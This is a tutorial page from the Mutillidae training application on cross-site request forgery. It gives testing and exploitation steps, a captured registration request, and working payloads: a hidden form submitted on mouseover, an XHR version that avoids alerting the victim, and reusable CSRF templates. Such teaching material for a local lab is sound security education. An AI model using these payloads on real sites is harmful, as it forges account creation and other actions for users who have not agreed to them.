<?php
	/*
	 * @author: Jeremy Druin
	 */
?>

<div>&nbsp;</div>
<table class="tutorial">
	<tr class="tutorial-title">
		<td colspan="10">Cross-Site Request Forgery Tutorial</td>
	</tr>
	<tr>
		<td>
			<br/>
			<span class="report-header">(One of many) CSRF Testing Methodology</span>
			<br/><br/>
			<ol>
				<li>Obtain permission to test</li>
				<li>Identify a sensitive transaction which is in test scope</li>
				<li>
					Execute the transaction (request) using an interception proxy
					<ul>
						<li>There is no requirement to forward the request. Capture is sufficient.</li>
					</ul>
				</li>
				<li>
					Identify the key information in the request
					<ul>
						<li>Request method</li>
						<li>Action page</li>
						<li>Input parameters</li>
					</ul>					
				</li>
				<li>
					Create a "requesting script" which will perform the same request without requiring a user to submit the transaction (i.e. - click the Submit button)
					<ul>
						<li>Use the template below. Fill in the $areas$ surrounded by the dollar signs.</li>
					</ul>
				</li>
				<li>Authenticate to the target site and leave the browser open</li>
				<li>Save the &quot;requesting script&quot; to an HTML document and open the document in a browser.</li>
				<li>
					View the target site or observer the response to verify the transaction completed
					<ul>
						<li>One way to acomplish this using a tool is to use the &quot;Repeater&quot; tab of Burp.
							The repeater allows requests to be tried and tweaked until successful. The 
							&quot;render&quot; feature in the response pane aids in seeing if the request succeeded.
						</li>
					</ul>
				</li>
			</ol>
		</td>	
	</tr>
	<tr>
		<td>
			<br/>
			<span class="report-header">(One of many) General CSRF Exploitation Methodology</span>
			<br/><br/>
			<ol>
				<li>
					Refering to the script created above (if it was possible to authenticate to the site for testing)
					<ul>
						<li>otherwise create the script</li>
					</ul>
				</li>
				<li>
					Locate an injection vulnerability in any site the user may visit while authenticated to target site
					<ul>
						<li>Alternatively load the script on a site under control and have the user visit the controlled site</li>
					</ul>
				</li>
				<li>Inject the "requesting script" into the "carrier" page. This could be a persistent XSS or javascript injection into an event action (i.e. - onload, onmouseover)</li>
				<li>Visit the poisoned page to verify the script sends the request to perform the transaction</li>
				<li>Verify the transaction completed</li>
			</ol>
		</td>
	</tr>
	<tr>
		<td>
			<br/>
			<span class="report-header">Exploiting Cross Site Request Forgery in Mutillidae</span>
			<br/><br/>
			Virtually all pages are vulnerable although not all pages contain transactions
			and not all transactions are sensitive. Possibilities include adding a blog 
			entry for the current user without them having to visit
			the &quot;Add Blog&quot; page or registering a new account of your choice by having 
			the user visit an infected page.
			<br/><br/>
			We already have permission to test Mutillidae assuming it is installed on your local machine.
			Lets assume that adding a new user account to Mutillidae is a sensitive transaction.
			Using the registration process as an example, start by capturing a request. One way
			to capture a request is by using the Burp interception proxy. This tool is preloaded
			if using the Samurai Web Testing Framework or Backtrack. Register a new user account
			with Burp running and interception enabled.
			<br/><br/>
			Here is a sample request captured using Burp on Samurai:
			<br/><br/>
<code>
<span class="important-code">POST /index.php?page=register.php</span> HTTP/1.1
    
Host: mutillidae
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.11) Gecko/20101013 Ubuntu/9.04 (jaunty) Firefox/3.6.11
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Keep-Alive: 115
Proxy-Connection: keep-alive
Referer: http://mutillidae/index.php?page=register.php
Cookie: PHPSESSID=1a28b85b825be0e5c9dc2789c63a3b44
Content-Type: application/x-www-form-urlencoded
Content-Length: 122

<span class="important-code">
username=username1&amp;;password=pass1&amp;confirm_password=pass1&amp;my_signature=signature1&amp;register-php-submit-button=Create+Account
</span>
</code>
			<br/><br/>
			Note the method, action, and input parameters. Use the CSRF template to create an HTML form injection
			that can send this request. Here is an example to create a user "sammy" with password "samurai".
			<br/><br/>
<code>
&lt;!--/*
The following is an attempt at humor; albeit a very poor attempt. 
People often ask &quot;What is the password for samurai?&quot;. The answer is below.
Be careful to escape single-quotes if inserting into MySQL. 
This example has the single quotes MySQL escaped (&#39; -&gt; \&#39;).
The try/catch is just to help you debug. This is not intended 
to be used when pen testing because if the exploit fails the user
is going to be notified. 
*/--&gt;
&lt;form id=&quot;CSRF&quot; method=&quot;POST&quot; action=&quot;/index.php?page=register.php&quot;&gt;
	&lt;input name=&quot;username&quot; 				value=&quot;sammy&quot; type=&quot;hidden&quot; /&gt;
	&lt;input name=&quot;password&quot; 				value=&quot;samurai&quot; type=&quot;hidden&quot; /&gt;
	&lt;input name=&quot;confirm_password&quot; 			value=&quot;samurai&quot; type=&quot;hidden&quot; /&gt;
	&lt;input name=&quot;my_signature&quot; 				value=&quot;The password is samurai&quot; type=&quot;hidden&quot; /&gt;
	&lt;input name=&quot;register-php-submit-button&quot; 	value=&quot;Create+Account&quot; type=&quot;hidden&quot; /&gt;
&lt;/form&gt;
&lt;span onmouseover=&quot;try{var lURL=document.location.href;document.getElementById(\&#39;CSRF\&#39;).submit();document.location.href=lURL;}catch(e){alert(e.message);}&quot;&gt;Hello World&lt;/span&gt;
</code>
				<br/><br/>
				On the Add to your Blog page (http://mutillidae/index.php?page=add-to-your-blog.php), 
				inject this exploit as a new blog. On either the Add Blog or the View Blog page, carefully 
				mouseover the blog text and watch for the page to reload. Try to log in with the new user. Trap requests with an
				interception proxy like Burp to watch the actual request. Submit the request with XHR to get rid
				of that pesky page reload which could alert the user. When using XHR, use an interception
				proxy to watch the request and the response. Otherwise you wont notice.
				<br/><br/>
				Here is the same example using XHR rather than the &quot;onmouseover&quot; event:
				<br/><br/>
<code>
&lt;script&gt;
	var lXMLHTTP;
	try{
		var lData = &quot;username=fred&amp;password=pass&amp;confirm_password=pass&amp;my_signature=signature1&amp;register-php-submit-button=Create+Account&quot;;
		var lAction = &quot;/index.php?page=register.php&quot;;
		var lMethod = &quot;POST&quot;;
		try {
			lXMLHTTP = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);
		}catch (e) { 
			try {
				lXMLHTTP = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
			}catch (e) {
				try {
					lXMLHTTP = new XMLHttpRequest();
				}catch (e) {
					alert(e.message);//THIS LINE IS TESTING AND DEMONSTRATION ONLY. DO NOT INCLUDE IN PEN TEST.
				}
			}
		}//end try
		lXMLHTTP.onreadystatechange = function(){
			if(lXMLHTTP.readyState == 4){
				alert(&quot;CSRF Complete&quot;);//THIS LINE IS TESTING AND DEMONSTRATION ONLY. DO NOT INCLUDE IN PEN TEST.
			}
		}
		/////////////////////////////
		//UNCOMMENT FOR GET REQUESTS
		/////////////////////////////
		//xmlhttp.open(lMethod, lAction, true);
		//lData=&quot;&quot;;
		/////////////////////////////

		/////////////////////////////
		//UNCOMMENT FOR POST REQUESTS
		/////////////////////////////
		lXMLHTTP.open(lMethod, lAction, true);
		lXMLHTTP.setRequestHeader(&quot;Method&quot;, &quot;POST &quot; + lAction + &quot; HTTP/1.1&quot;);
		lXMLHTTP.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);
		/////////////////////////////
		
		lXMLHTTP.send(lData);
	}catch(e){
		alert(e.message);//THIS LINE IS TESTING AND DEMONSTRATION ONLY. DO NOT INCLUDE IN PEN TEST.
	}
&lt;/script&gt;
</code>
<br/><br/>
<span class="report-header">Appendix A - CSRF Templates</span>
<br/><br/>
<code>
/* HTML Injection based CSRF template */
&lt;form id=&quot;CSRFForm&quot; method=&quot;$REQUEST-METHOD-HERE$&quot; action=&quot;$SUBMIT-ACTION-PAGE-HERE$&quot;&gt;

	$FOR-EACH-REQUEST-INPUT-PARAMETER$
	&lt;input type=&quot;hidden&quot; name=&quot;$PARAMETER-NAME$&quot; value=&quot;$PARAMETER-VALUE$&quot; /&gt;
	$END-FOR$
&lt;/form&gt;
/* Now choose an event which when triggered will submit the form. Here are some examples */
&lt;body onload=&#39;window.document.getElementById(&quot;CSRFForm&quot;).submit();&#39;&gt;
&lt;span onmouseover=&#39;window.document.getElementById(&quot;CSRFForm&quot;).submit();&#39;&gt;Hello World&lt;/span&gt;
    
/* JavaScript Injection based CSRF template */
/* NOTE: Script tags are only needed if injection is into HTML context. 
If injecting into JavaScript context, do not include script tags. */
&lt;script&gt;
  	var lCSRFForm = window.document.createElement(&quot;form&quot;);
   	lCSRFForm.name=&quot;CSRFForm&quot;;
   	lCSRFForm.method=&quot;$REQUEST-METHOD-HERE$&quot;;
	lCSRFForm.action=&quot;$SUBMIT-ACTION-PAGE-HERE$&quot;
   	$FOR-EACH-REQUEST-INPUT-PARAMETER$
   		var lInput = document.createElement(&quot;input&quot;);
   		lInput.type=&quot;hidden&quot;;
   		lInput.name=&quot;$PARAMETER-NAME$&quot;;
   		lInput.value=&quot;$PARAMETER-VALUE$&quot;;
   		lCSRFForm.appendChild(lInput);
   	$END-FOR$
   	window.document.appendChild(lCSRFForm);
   	lCSRFForm.submit();
&lt;/script&gt;

&lt;script&gt;
	var lXMLHTTP;
	try{
		var lData = &quot;$THE-ENTIRE-POST-PARAMETER-STRING-COPIED-FROM-REQUEST-OR-TYPED-IN$&quot;;
		var lAction = &quot;$SUBMIT-ACTION-PAGE-HERE$&quot;;
		var lMethod = &quot;$REQUEST-METHOD-HERE$&quot;;
		try {
			lXMLHTTP = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);
		}catch (e) { 
			try {
				lXMLHTTP = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
			}catch (e) {
				try {
					lXMLHTTP = new XMLHttpRequest();
				}catch (e) {
					alert(e.message);//THIS LINE IS TESTING AND DEMONSTRATION ONLY. DO NOT INCLUDE IN PEN TEST.
				}
			}
		}//end try
		lXMLHTTP.onreadystatechange = function(){
			if(lXMLHTTP.readyState == 4){
				alert(&quot;CSRF Complete&quot;);//THIS LINE IS TESTING AND DEMONSTRATION ONLY. DO NOT INCLUDE IN PEN TEST.
			}
		}
		/////////////////////////////
		//UNCOMMENT FOR GET REQUESTS
		/////////////////////////////
		//xmlhttp.open(lMethod, lAction, true);
		//lData=&quot;&quot;;
		/////////////////////////////

		/////////////////////////////
		//UNCOMMENT FOR POST REQUESTS
		/////////////////////////////
		lXMLHTTP.open(lMethod, lAction, true);
		lXMLHTTP.setRequestHeader(&quot;Method&quot;, &quot;POST &quot; + lAction + &quot; HTTP/1.1&quot;);
		lXMLHTTP.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);
		lXMLHTTP.send(lData);
	}catch(e){
		alert(e.message);//THIS LINE IS TESTING AND DEMONSTRATION ONLY. DO NOT INCLUDE IN PEN TEST.
	}
&lt;/script&gt;
</code>
		</td>
	</tr>
</table>